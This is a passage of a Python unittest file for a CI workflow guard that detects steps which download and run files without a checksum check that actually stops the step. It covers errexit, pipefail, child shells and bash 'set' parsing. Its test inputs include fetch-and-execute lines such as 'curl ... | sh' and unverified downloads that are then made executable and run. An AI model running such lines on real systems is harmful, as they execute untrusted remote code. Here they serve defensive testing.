        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_quoted_heredoc_body_is_literal_text(self):
        script = "cat <<'EOF' > /tmp/note\n$(curl -fsSL https://example.test/i.sh)\nEOF\n"
        self.assertEqual([], wg.fetches(script))

    def test_a_fetch_inside_a_function_body(self):
        # M1: `f() { ... }` is where a long step keeps its download, and the
        # function name stood where the command was expected.
        for opener in ("f() {", "f () {", "function f {"):
            script = (opener + " curl -fsSL https://example.test/x -o /tmp/x; }\n"
                      "f\nchmod +x /tmp/x\n")
            self.assertEqual(1, len(wg.fetches(script)), opener)
            self.assertIsNotNone(wg.fetch_exec_defect(script), opener)

    def test_a_fetch_inside_a_subshell(self):
        script = ("( curl -fsSL https://example.test/x -o /tmp/x )\n"
                  "chmod +x /tmp/x\n")
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_download_with_no_parseable_url_is_reported_not_dropped(self):
        # L2: `wget -i list.txt` downloads a LIST of URLs to names this guard
        # cannot know. Unparsed is not clean; say so.
        why = wg.fetch_exec_defect("wget -i list.txt\n")
        self.assertIsNotNone(why)
        self.assertIn("wget", why)

    def test_asking_curl_its_version_is_not_a_download(self):
        for script in ("curl --version\n", "wget --help\n", "curl -V\n"):
            self.assertEqual([], wg.fetches(script), script)
            self.assertIsNone(wg.fetch_exec_defect(script), script)

    def test_a_substitution_carrying_a_heredoc_marker_does_not_crash(self):
        # #1697 review F7: the OUTER parse lifts the heredoc body and leaves
        # `@@heredoc0@@` inside the substitution's text; re-reading that text
        # is a second parse, whose tables held no entry for it until #2336. A
        # guard that raises reports nothing at all, worse than reporting a gap.
        for script in ('eval "$(cat <<\'EOF\'\n'
                       "curl -sfL https://example.test/p -o /tmp/p\n"
                       "chmod +x /tmp/p\n"
                       'EOF\n)"\n',
                       'sh -c "$(cat <<\'EOF\'\nhello\nEOF\n)"\n',
                       'X="$(cat <<\'EOF\'\nhello\nEOF\n)"\n'):
            wg.fetch_exec_defect(script)        # must not raise
            wg.fetches(script)

    def test_a_shifted_left_string_is_not_a_heredoc(self):
        # `<<` inside a quoted string has no terminator line; reading it as a
        # heredoc swallows the rest of the step, and every statement after it
        # disappears from the guard.
        script = ('echo "shift << 2"\n'
                  "curl -fsSL https://example.test/p | sh\n")
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_destination_carried_in_a_variable(self):
        # `TMP=$(mktemp)` is how a careful step names its download, and the
        # guard follows the NAME the shell uses, not a resolved path.
        script = ('TMP="$(mktemp)"\n'
                  'curl -fsSL https://example.test/p -o "$TMP"\n'
                  'chmod +x "$TMP"\n')
        self.assertEqual("$TMP", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_an_md5_check_is_not_a_sha256_check(self):
        # `-c` on a weaker digest tool is a check of something, but not of what
        # this rule is about; the old regex read `sha256sum|shasum` and this
        # one reads a list, so the list is what gets asserted.
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  'echo "%s  /tmp/p" | md5sum -c -\n' % ("a" * 32) +
                  "chmod +x /tmp/p\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_numeric_chmod_that_sets_any_execute_bit(self):
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  "chmod 750 /tmp/p\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))


class TestTheHadolintStep(unittest.TestCase):
    """The real step this rule was written for, in both answers (carried over
    from `tests/test_workflow_pins.py`'s TestFetchExecRule)."""

    HADOLINT = ("curl -sfL --connect-timeout 5 --max-time 60 --retry 3 \\\n"
                "  -o /tmp/hadolint \\\n"
                "  https://example.test/hadolint-Linux-x86_64\n"
                "chmod +x /tmp/hadolint\n"
                "sudo mv /tmp/hadolint /usr/local/bin/hadolint\n")

    def test_the_unverified_fetch_and_exec_is_a_defect(self):
        self.assertIn("/tmp/hadolint", wg.fetch_exec_defect(self.HADOLINT))

    def test_a_checksum_clears_it(self):
        verified = self.HADOLINT.replace(
            "chmod +x", 'echo "$SHA  /tmp/hadolint" | sha256sum -c -\nchmod +x')
        self.assertIsNone(wg.fetch_exec_defect(verified))

    def test_a_checksum_after_the_chmod_is_still_a_defect(self):
        late = self.HADOLINT.replace(
            "sudo mv", 'echo "$SHA  /tmp/hadolint" | sha256sum -c -\nsudo mv')
        self.assertIn("only AFTER", wg.fetch_exec_defect(late))

    def test_an_interpreter_invocation_counts_as_executing(self):
        script = ("curl -sfL https://example.test/i.py -o /tmp/i.py\n"
                  "python3 /tmp/i.py\n")
        self.assertIn("/tmp/i.py", wg.fetch_exec_defect(script))


class TestASwallowedCheckIsNotACheck(unittest.TestCase):
    """M2: a checksum whose non-zero exit nobody sees verified nothing.

    Runners default to `bash -e`, which is what makes `sha256sum -c` a GATE:
    the job stops. Put the check on the left of `||`, in the background, or
    under a negation and the step sails past a mismatch -- while the guard,
    reading only the command name, called it verified.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    EXEC = "chmod +x /tmp/payload\n"

    def swallowed(self, check):
        return wg.fetch_exec_defect(self.FETCH + check + self.EXEC)

    def test_or_true(self):
        self.assertIsNotNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c - || true\n' % HEX))

    def test_or_a_warning_annotation(self):
        # nvd-cache.yml uses exactly this idiom for a DIFFERENT command; the
        # point is that the guard must read the separator, not the intent.
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" | sha256sum -c - '
            '|| echo "::warning::checksum mismatch"\n' % HEX))

    def test_backgrounded(self):
        self.assertIsNotNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c - &\n' % HEX))

    def test_under_a_negation(self):
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
            "if ! sha256sum -c /tmp/sums; then echo mismatch; fi\n"))

    def test_under_an_if_condition(self):
        # M3: errexit never applies to an `if` CONDITION, so the step sails
        # past a mismatch exactly as it does with `|| true` -- the unsafe
        # mirror of the `if !` form above.
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
            "if sha256sum -c /tmp/sums; then echo ok; fi\n"))

    def test_or_exit_is_a_gate_not_a_swallow(self):
        # L1: `|| exit 1` ends the job, which is what errexit would have done.
        # It is the cheap hardened spelling, so it must not be refused.
        for branch in ("|| exit 1", "|| exit 2", "|| { echo bad; exit 1; }",
                       "|| { echo '::error::mismatch'; exit 1; }", "|| false"):
            self.assertIsNone(self.swallowed(
                'echo "%s  /tmp/payload" | sha256sum -c - %s\n' % (HEX, branch)),
                branch)

    def test_an_if_test_whose_check_is_the_second_pipeline_stage(self):
        # #1697 item 2, and the FIRST one the issue asks for: the `if` sits on
        # the pipeline HEAD (`echo`), so asking the checksum's own stage
        # whether it is a test answers no -- and this is the spelling the
        # guard's own remedy text recommends, so it is the one an author is
        # most likely to wrap.
        self.assertIsNotNone(self.swallowed(
            'if echo "%s  /tmp/payload" | sha256sum -c -; then :; fi\n' % HEX))

    def test_a_negation_on_the_pipeline_head(self):
        self.assertIsNotNone(self.swallowed(
            '! echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX))

    def test_a_while_test_whose_check_is_the_second_pipeline_stage(self):
        self.assertIsNotNone(self.swallowed(
            'while echo "%s  /tmp/payload" | sha256sum -c -; do break; done\n'
            % HEX))

    def test_a_plain_check_still_counts(self):
        self.assertIsNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX))

    def test_a_check_joined_with_and_counts_only_inside_its_list(self):
        # #2334: bash suspends `-e` for a command ahead of `&&`, so a failing
        # check skips the rest of its list and the step carries on -- bash
        # 3.2 and 5.2 run the later `chmod +x` with the check failing, and
        # skip one written inside the list.
        check = 'echo "%s  /tmp/payload" | sha256sum -c -' % HEX
        found = wg.job_defects([("s", self.FETCH + check + " && echo verified\n" + self.EXEC)])
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names /tmp/payload runs ahead of `&&`", found[0][1])
        self.assertEqual([], wg.job_defects([("s", self.FETCH + check + " && " + self.EXEC)]))
        self.assertIn("runs ahead of `&&`", self.swallowed(check + " && echo verified\n"))
        self.assertIsNone(self.swallowed(check + " && "))


class TestACheckInsideAScriptMustStopTheStep(unittest.TestCase):
    """Review I-2 of the #1793 follow-ups: a checksum inside a script handed to
    `sh -c`, to a shell's standard input (a quoted heredoc, and since #2293 a
    here-string) or to `eval` was credited as if the step's own shell ran it.
    A child shell has no `-e` unless it is given one, and exits with its last
    command's status: bash 3.2 and 5.2 run `./tool` with the checksum failing
    after `sh -c 'CHECK; echo ok'` and after `sh -c 'CHECK' || true`. Such a
    checksum now clears a use only where its failure stops the step: it stops
    the script (`-e` holds there, or it is the script's last command, the last
    of its pipeline unless the script's own pipefail holds) and the command
    handing the script over does not swallow that. `eval` runs in the step's
    own shell, so its script keeps the step's `-e` and pipefail -- except
    `-e` where bash suspends it, behind `||`/`&&`, `!` or `if`."""

    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
    CHECK = 'echo "%s  tool" | sha256sum -c -' % HEX

    def job(self, form, check=CHECK):
        return wg.job_defects([("step", self.FETCH + form % check + "\n./tool\n")])

    def assertReported(self, form, why, check=CHECK):
        found = self.job(form, check)
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names tool is inside the script", found[0][1])
        self.assertIn(why, found[0][1])

    def test_a_check_the_script_carries_on_past_is_reported(self):
        for form in ("sh -c '%s; echo ok'", "sh <<< '%s; echo ok'",
                     "sh <<'EOF'\n%s\necho ok\nEOF", "sh -c 'set -e; set +e; %s; echo ok'",
                     "eval '%s; echo ok' || exit 1", "bash -o pipefail -c '%s | cat; echo ok'"):
            with self.subTest(form=form):
                self.assertReported(form, "carries on past its failure")
        self.assertReported('sh -c "sh -c \'%s\'; echo ok"', "the step does not stop",
                            self.CHECK.replace('"', '\\"'))

    def test_a_child_script_in_a_distant_function_stays_fail_closed_without_step_credit(self):
        # `flattened` must recurse before `step_credit` exists. Its no-credit
        # `swallowed` call can return a FunctionGate, but the `is None` test
        # cannot turn that proof object into credit for the child script.
        seen = []
        swallowed = workflow_forms.swallowed

        def observed(*args, **kwargs):
            answer = swallowed(*args, **kwargs)
            seen.append((answer, len(args), kwargs))
            return answer

        with mock.patch.object(workflow_forms, "swallowed", side_effect=observed):
            found = self.job("f() { ( sh -c '%s' || exit 1 ); }\necho hi\nf")
        self.assertTrue(any(isinstance(answer, workflow_gating.FunctionGate)
                            and arity == 4 and "credit" not in kwargs
                            for answer, arity, kwargs in seen), seen)
        self.assertEqual(1, len(found), found)
        self.assertIn("inside the script `sh` runs", found[0][1])

    def test_a_check_piped_into_another_command_in_the_script_is_reported(self):
        # Re-review N-D: unless the script's own pipefail holds, read from
        # its options or a plain `set` as its `-e` is.
        for form in ("sh -c '%s | cat'", "sh -ec '%s | cat; echo ok'",
                     "bash -c 'set -o pipefail; set +o pipefail; %s | cat'"):
            with self.subTest(form=form):
                self.assertReported(form, "piped into a command whose status the pipeline takes")
        with self.subTest(form="an eval in it keeps the script's"):
            self.assertReported("sh -c 'eval \"%s | cat\"'", "piped into a command whose status",
                                self.CHECK.replace('"', '\\"'))

    def test_a_child_shells_dash_O_takes_a_value_as_a_command_line_does(self):
        # #2444: on a shell's COMMAND LINE `-O extglob` is one option with
        # its value, so the `-ec` behind it is read and the failing check
        # stops the child before `./tool` -- bash 3.2.57 and 5.2.21 both stop
        # it, and a `sh` that refuses `-O` runs nothing at all. The step's
        # own `shell:` template was read so already (`seed`, #2338); a child
        # shell was read as the `set` builtin is, where `-O` is no option.
        for form in ("bash -O extglob -ec '%s; echo ok'", "sh +O extglob -ec '%s; echo ok'",
                     "bash -O extglob -eo pipefail -c '%s | cat; echo ok'",
                     "bash -eO extglob -c '%s; echo ok'"):
            with self.subTest(form=form):
                self.assertEqual([], self.job(form))
        # The must-trip control: with no `-e` the child carries on past the
        # failing check, as it did.
        self.assertReported("bash -O extglob -c '%s; echo ok'", "carries on past its failure")

    def test_a_script_whose_failure_the_step_goes_on_past_is_reported(self):
        for form in ("sh -c '%s' || true", "sh <<< '%s' || true",
                     "sh -ec '%s; echo ok' || true", "if sh -c '%s'; then :; fi",
                     "! sh -c '%s'", "eval '%s; echo ok' || true", "eval '%s' || true"):
            with self.subTest(form=form):
                self.assertReported(form, "the step does not stop when that script fails")

    def test_a_check_that_stops_the_script_and_the_step_still_clears(self):
        for form in ("sh -c '%s'", "sh <<< '%s'", "sh <<'EOF'\n%s\nEOF",
                     "sh -ec '%s; echo ok'", "sh -e -c '%s; echo ok'",
                     "bash -euo pipefail -c '%s; echo ok'", "sh <<< 'set -e; %s; echo ok'",
                     "sh -c 'set -o errexit; %s; echo ok'",
                     "bash -e <<'EOF'\n%s\necho ok\nEOF", "eval '%s; echo ok'",
                     "eval '%s' || exit 1", "sh -c '%s' || exit 1",
                     "bash -o pipefail -c '%s | cat'", "bash -eo pipefail -c '%s | cat; echo ok'",
                     "bash -c 'set -o pipefail; %s | cat'", "bash -o errexit -o pipefail "
                     "-c '%s | cat; echo ok'", "sh -c 'set -euo pipefail; %s | cat; echo ok'"):
            with self.subTest(form=form):
                self.assertEqual([], self.job(form))
        self.assertEqual([], self.job('sh -c "sh -c \'%s\'"', self.CHECK.replace('"', '\\"')))

    def test_the_top_level_twins_read_as_before(self):
        # The must-trip controls: the step's own `CHECK || true` is reported
        # on every tree, and its own `CHECK` clears.
        self.assertIn("hands its failure to a `||` branch", self.job("%s || true")[0][1])
        self.assertEqual([], self.job("%s"))

    def test_an_exit_behind_the_check_in_a_script_without_e_is_not_read(self):
        # Fail-closed, and the rule's known over-reports (re-review N-D): bash
        # stops each of these scripts at the failing check -- at `exit 1`, at
        # `exit $?`, and under a `set -e` or `set -o pipefail` written inside
        # a branch -- but only `-e` or pipefail from the script's options or
        # a plain `set`, or its last command, are read as stopping it.
        self.assertReported("sh -c '%s || exit 1; echo ok'", "carries on past its failure")
        self.assertReported("sh -c '%s; exit $?'", "carries on past its failure")
        self.assertReported("sh -c 'if true; then set -e; fi; %s; echo ok'",
                            "carries on past its failure")
        self.assertReported("bash -c 'if true; then set -o pipefail; fi; %s | cat'",
                            "piped into a command whose status the pipeline takes")


class TestASetPlusEAtTheStepsTopLevel(unittest.TestCase):
    """#2335: a `set +e` at the step's top level turns errexit off from there
    on, so a failing check no longer stops the step and bash 3.2 and 5.2 run
    the later use -- but the guard credited the check, reading `-e` as always
    on outside a child script. The step's own statements now carry `-e` the
    way a child script's do (`workflow_forms._errexit_states`): a `set` turns
    it on only as a plain statement outside every branch, group and list, and
    off wherever it is -- `eval`'s too, which runs in the step's own shell.
    Where it is off, a check still stops the step in its last command, or
    through an `||` branch that exits (an `exit` ends the step whatever `-e`
    says; a `false` does not)."""

    FETCH = "curl -fsSLo /tmp/payload https://example.test/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -' % HEX
    USE = "chmod +x /tmp/payload && /tmp/payload\n"

    def job(self, body, shell=None, use=USE):
        return wg.job_defects([wg.Step("step", self.FETCH + body % self.CHECK + use, shell)])

    def test_a_check_after_set_plus_e_is_reported_under_every_shell(self):
        for shell in (None, "sh", "bash"):
            for body in ("set +e\n%s\n", "set +o errexit\n%s\n", "set -e\nset +e\n%s\n",
                         "if true; then set +e; fi\n%s\n", "set +e\n%s || false\n",
                         "eval 'set +e'\n%s\n", "eval set +e\n%s\n"):
                with self.subTest(shell=shell, body=body):
                    found = self.job(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload runs after a `set +e`",
                                  found[0][1])

    def test_a_script_handed_on_after_set_plus_e_is_reported(self):
        # `flattened` credits the script as far as the command running it;
        # that command runs after the `set +e`, so its failure goes nowhere.
        for body in ("set +e\nsh -c '%s'\n", "set +e\neval '%s'\n",
                     "set +e\nbash <<'EOF'\n%s\nEOF\n"):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])

    def test_a_set_plus_e_that_eval_runs_inside_a_script_is_read_there(self):
        found = self.job("sh -ec 'eval \"set +e\"; %s; echo ok'\n")
        self.assertEqual(1, len(found), found)
        self.assertIn("carries on past its failure", found[0][1])

    def test_what_still_stops_the_step_with_errexit_off(self):
        for body in ("set +e\n%s || exit 1\n", 'set +e\n%s || { echo "::error::bad"; exit 1; }\n',
                     "set +e\nset -e\n%s\n", "%s\nset +e\n", "set +e\nsh -c '%s' || exit 1\n",
                     "sh -c 'set +e'\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body))
        # The use inside the list the check heads is skipped when it fails.
        self.assertEqual([], self.job("set +e\n%s && "))
        # As the step's last command its failure is the step's: the job stops.
        self.assertEqual([], wg.job_defects([wg.Step("get", self.FETCH + "set +e\n" + self.CHECK),
                                             wg.Step("run", self.USE)]))

    def test_the_top_level_controls_read_as_before(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("%s\n", shell))
                self.assertIn("hands its failure to a `||` branch",
                              self.job("%s || true\n", shell)[0][1])


class TestAParentRefusalKeepsAChildScriptsReach(unittest.TestCase):
    """#2423: a parent that carries on past a failed child still respects
    the child's own `-e` inside the script it runs."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    INLINE_USE = USE.replace("\n", "; ").rstrip("; ")
    job = TestASetPlusEAtTheStepsTopLevel.job

    def test_set_plus_e_bounds_its_refusal_to_the_child_command(self):
        inside = "set +e\nsh -ec '%s; " + self.INLINE_USE + "'\necho done\n"
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell, use="inside"):
                self.assertEqual([], self.job(inside, shell, use=""))
            with self.subTest(shell=shell, use="outside"):
                found = self.job(inside, shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])

    def test_a_no_errexit_template_bounds_its_refusal_to_the_child_command(self):
        inside = "sh -ec '%s; " + self.INLINE_USE + "'\necho done\n"
        for shell in ("bash {0}", "sh {0}"):
            with self.subTest(shell=shell, use="inside"):
                self.assertEqual([], self.job(inside, shell, use=""))
            with self.subTest(shell=shell, use="outside"):
                found = self.job(inside, shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs under `shell: %s`" % shell, found[0][1])

    def test_a_piped_groups_refusal_keeps_the_childs_own_reach(self):
        child = "sh -ec '%s; " + self.INLINE_USE + "'"
        body = "{\n" + child + "\n} | cat\n"
        for shell in (None, "sh"):
            with self.subTest(shell=shell, use="inside"):
                self.assertEqual([], self.job(body, shell, use=""))
            with self.subTest(shell=shell, use="outside"):
                found = self.job(body, shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("ends a group that is piped", found[0][1])

    def test_a_piped_check_stays_refused_without_child_pipefail(self):
        child = "sh -ec '%s | cat; " + self.INLINE_USE + "'"
        for prefix, suffix, shell in (
                ("set +e\n", "\necho done\n", None),
                ("", "\necho done\n", "bash {0}"),
                ("{\n", "\n} | cat\n", None),
                ("{\n", "\n} | cat\n", "sh")):
            with self.subTest(prefix=prefix, shell=shell):
                found = self.job(prefix + child + suffix, shell, use="")
                self.assertEqual(1, len(found), found)
                self.assertIn("piped into a command whose status the pipeline takes", found[0][1])

    def test_an_and_or_list_suspends_the_childs_errexit(self):
        for operator in ("&&", "||"):
            child = "sh -ec '%s " + operator + " echo checked; " + self.INLINE_USE + "'"
            for prefix, suffix, shell in (
                    ("set +e\n", "\necho done\n", None),
                    ("", "\necho done\n", "bash {0}"),
                    ("{\n", "\n} | cat\n", "sh")):
                with self.subTest(operator=operator, prefix=prefix, shell=shell):
                    found = self.job(prefix + child + suffix, shell, use="")
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload", found[0][1])

    def test_an_and_list_still_gates_a_use_inside_it(self):
        child = "sh -ec '%s && " + self.INLINE_USE + "'"
        for prefix, suffix, shell in (
                ("set +e\n", "\necho done\n", None),
                ("", "\necho done\n", "bash {0}"),
                ("{\n", "\n} | cat\n", "sh")):
            with self.subTest(prefix=prefix, shell=shell):
                self.assertEqual([], self.job(prefix + child + suffix, shell, use=""))

    def test_a_compound_and_list_suspends_the_childs_errexit(self):
        child = "sh -ec '{ %s; } && echo checked; " + self.INLINE_USE + "'"
        for prefix, suffix, shell in (
                ("set +e\n", "\necho done\n", None),
                ("", "\necho done\n", "bash {0}"),
                ("{\n", "\n} | cat\n", "sh")):
            with self.subTest(prefix=prefix, shell=shell):
                found = self.job(prefix + child + suffix, shell, use="")
                self.assertEqual(1, len(found), found)
                self.assertIn("the checksum that names /tmp/payload", found[0][1])

    def test_a_condition_suspends_the_childs_errexit(self):
        child = "sh -ec 'if %s; then echo checked; fi; " + self.INLINE_USE + "'"
        for prefix, suffix, shell in (
                ("set +e\n", "\necho done\n", None),
                ("", "\necho done\n", "bash {0}"),
                ("{\n", "\n} | cat\n", "sh")):
            with self.subTest(prefix=prefix, shell=shell):
                found = self.job(prefix + child + suffix, shell, use="")
                self.assertEqual(1, len(found), found)
                self.assertIn("the checksum that names /tmp/payload", found[0][1])

    def test_a_child_without_errexit_remains_refused(self):
        child = "sh -c '%s; " + self.INLINE_USE + "'"
        for prefix, suffix, shell in (
                ("set +e\n", "\necho done\n", None),
                ("", "\necho done\n", "sh {0}"),
                ("{\n", "\n} | cat\n", None),
                ("{\n", "\n} | cat\n", "sh")):
            with self.subTest(prefix=prefix, shell=shell):
                found = self.job(prefix + child + suffix, shell, use="")
                self.assertEqual(1, len(found), found)
                self.assertIn("inside the script `sh` runs", found[0][1])


class TestAPipedCheckGatesOnlyUnderPipefail(unittest.TestCase):
    """#2338: a pipeline's status is its LAST command's unless `pipefail`
    holds, so a check piped into another command (`CHECK | tee log`) stops
    nothing where it is off -- and GitHub runs a step with no `shell:` as
    `bash -e {0}`, which has none: `shell: bash` adds `-o pipefail`, `shell:
    sh` is `sh -e {0}`, and a template (`bash {0}`) runs with exactly the
    options it writes. The guard read every step as if pipefail held. The
    step's `shell:` now seeds its `-e` and pipefail (`workflow_gating.seed`),
    a top-level `set` moves them, and `read(script)` without a shell reads
    the runner default."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    PIPED = "%s | tee log\n"
    job = TestASetPlusEAtTheStepsTopLevel.job

    def test_a_piped_check_without_pipefail_is_reported(self):
        for shell, body in ((None, self.PIPED), ("sh", self.PIPED),
                            ("bash", "set +o pipefail\n" + self.PIPED), ("bash -e {0}", self.PIPED),
                            ("bash {0}", self.PIPED)):
            with self.subTest(shell=shell, body=body):
                found = self.job(body, shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("the checksum that names /tmp/payload is piped into another "
                              "command where this guard reads `pipefail` as off", found[0][1])
                self.assertIn("(`shell: bash` turns pipefail on, and so does a `set -o pipefail` "
                              "before it where the shell is bash)", found[0][1])
        self.assertIn("where this guard reads `pipefail` as off",
                      wg.fetch_exec_defect(self.FETCH + self.PIPED % self.CHECK + self.USE))

    def test_a_piped_check_under_pipefail_still_clears(self):
        # bash's `-O` takes a value (final review N-3), so `extglob` does not
        # end the options: the `-e` after it still seeds errexit.
        for shell, body in (("bash", self.PIPED), (None, "set -o pipefail\n" + self.PIPED),
                            ("bash -eo pipefail {0}", self.PIPED),
                            ("bash -O extglob -eo pipefail {0}", self.PIPED),
                            ("bash -eO extglob -o pipefail {0}", self.PIPED),
                            ("/bin/bash --noprofile --norc -eo pipefail {0}", self.PIPED)):
            with self.subTest(shell=shell, body=body):
                self.assertEqual([], self.job(body, shell))
        found = self.job("%s\n", "bash -O extglob {0}")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs under `shell: bash -O extglob {0}`, which this guard reads as starting "
                      "without errexit", found[0][1])

    def test_a_set_line_takes_no_value_after_O(self):
        # Only a template's `-O` takes one: bash's `set` rejects `-O` outright
        # (rc 2) and leaves errexit off, so the check after it stops nothing.
        found = self.job("set +e\nset -O foo -e\n%s\n")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs after a `set +e`", found[0][1])
        self.assertEqual([], self.job("set +e\nset -e\n%s\n"))

    def test_a_set_carrying_a_letter_the_builtin_lacks_turns_nothing_on(self):
        # #2443: bash answers the whole `set` with `set: -Z: invalid option`,
        # rc 2, and changes no option, so errexit stays off and the check
        # after it stops nothing -- bash 3.2.57 and 5.2.21 run the download
        # with the checksum failing. A `+e` in such a word still reads as
        # off, which is fail-closed either way.
        # Review NIT 4: bash's `set` has no LONG option, so `set --posix -e`
        # is the same refusal (rc 0 on both bashes with errexit left off, and
        # `sh`/dash die at it). Review NIT 6: `-oo x` takes ONE value word
        # here, as `_errexit` takes it, so the `-Ze` behind it is still read
        # -- both bashes answer `set: x: invalid option name` and set nothing.
        for body in ("set +e\nset -Z -e\n%s\n", "set +e\nset -eO foo\n%s\n",
                     "set +e\nset -e -Z\n%s\n", "set +e\nset +Ze\n%s\n",
                     "set +e\nset --posix -e\n%s\n", "set +e\nset -oo x -Ze\n%s\n"):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])
        # The controls: a `set` of letters the builtin has turns it on as it
        # did, and so does the `-o` name no letter spells. `set -r` is one of
        # them -- both bashes, zsh and ksh leave errexit ON after
        # `set -r -e`, and dash dies at the `set` (review NIT 3).
        for body in ("set +e\nset -e\n%s\n", "set +e\nset -eux\n%s\n",
                     "set +e\nset -o errexit\n%s\n", "set +e\nset -r -e\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body))
        # `set --` is the positional spelling, not a long option: it is no
        # refusal, and it reads no option either way, so these two answer as
        # they did on main.
        self.assertEqual([], self.job('set -e\nset -- "$@"\n%s\n'))
        self.assertIn("runs after a `set +e`", self.job('set +e\nset -- "$@"\n%s\n')[0][1])

    def test_the_script_twins_take_the_steps_pipefail(self):
        # The child's own pipefail covers its inner pipe, not the outer one
        # whose status `tee` sets; `eval` runs in the step's shell and so
        # inherits whatever pipefail the step has.
        for form, why in (("bash -c 'set -o pipefail; %s | cat' | tee log\n",
                           "the step does not stop when that script fails"),
                          ("eval '%s | cat'\n", "piped into a command whose status")):
            with self.subTest(form=form):
                found = self.job(form)
                self.assertEqual(1, len(found), found)
                self.assertIn(why, found[0][1])
                self.assertEqual([], self.job(form, "bash"))

    def test_a_template_without_e_gates_nothing_a_rescue_does_not(self):
        found = self.job("%s\n", "bash {0}")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs under `shell: bash {0}`, which this guard reads as starting without "
                      "errexit", found[0][1])
        for body in ("%s || exit 1\n", "set -e\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body, "bash {0}"))
        for shell in ("bash -e {0}", "bash -eo pipefail {0}", "sh -e {0}"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("%s\n", shell))


class TestASetsValuesAreCountedPerLetterAndCheckedByName(unittest.TestCase):
    """#2559 and #2560: bash's `set` takes one option NAME per `o` LETTER, and
    refuses a name that is not one of its own; this guard took one value per
    option WORD and read no name at all. So `set -oo pipefail errexit` left
    errexit off here where bash turns it ON -- the second `o` takes `errexit`,
    and `$#` stays 0 -- and `set -o foo -e` read errexit back ON where bash
    answers `set: foo: invalid option name`, leaves errexit off and runs the
    download with the checksum failing (#2560's fail-open).

    Values now count per letter, as `workflow_programs._past_options` and
    `stdin_program` already count them, and a `-o` value outside
    `SET_OPTION_NAMES` refuses the whole `set` as an unknown LETTER does
    (#2443): a `+e` in it still reads as off, and on a COMMAND LINE the shell
    exits instead, so no program is handed over (`SHELL_OPTION_NAMES`, the
    union over the measured shells, in `TestTheProgramAfterDashC`).

    Reading a refused `set` as setting NOTHING is the fail-closed pick, not
    bash to the letter: bash applies the names BEFORE the bad one and stops
    there -- `set +e; set -o pipefail -o foo` leaves pipefail ON (rc 0,
    SURVIVED printed, bash 3.2.57 and 5.2.21) -- but where the name it
    applied was errexit the failing `set` then exits the shell under it and
    nothing after it runs at all (`set +e; set -e -o foo`, rc 1 on 3.2.57 and
    rc 2 on 5.2.21, nothing printed after). An unknown LETTER is not like
    that: bash validates a WORD's letters before applying that word, so
    `set +e; set -o errexit -Z` leaves errexit OFF (rc 0, SURVIVED), though a
    name an earlier word applied stays (`set -ox pipefail -Z`: pipefail ON)."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    PIPED = TestAPipedCheckGatesOnlyUnderPipefail.PIPED
    job = TestASetPlusEAtTheStepsTopLevel.job

    def test_a_set_takes_one_option_value_per_o_letter(self):
        # Each row was run as `SHELL -c` with `false; echo SURVIVED` behind
        # the `set`, so no SURVIVED means errexit is ON:
        # bash 3.2.57: `set -oo pipefail errexit; echo "$# $-"` -> `0 ehBc`,
        #   rc 1 and no SURVIVED -- one value per `o`, and no positional.
        # bash 5.2.21: `0 ehBc`, rc 1 and no SURVIVED, the same.
        # dash: `set: Illegal option -o pipefail`, rc 2 -- it dies at the
        #   `set`, so nothing after it runs there at all.
        # `set -oe xtrace y; echo "$# $1 $-"` is `1 y ehxBc` on both bashes
        # and `1 y xe` on dash: the `o` took `xtrace`, the `e` set errexit
        # and `y` is the positional. `set -eo pipefail` is unchanged (ON).
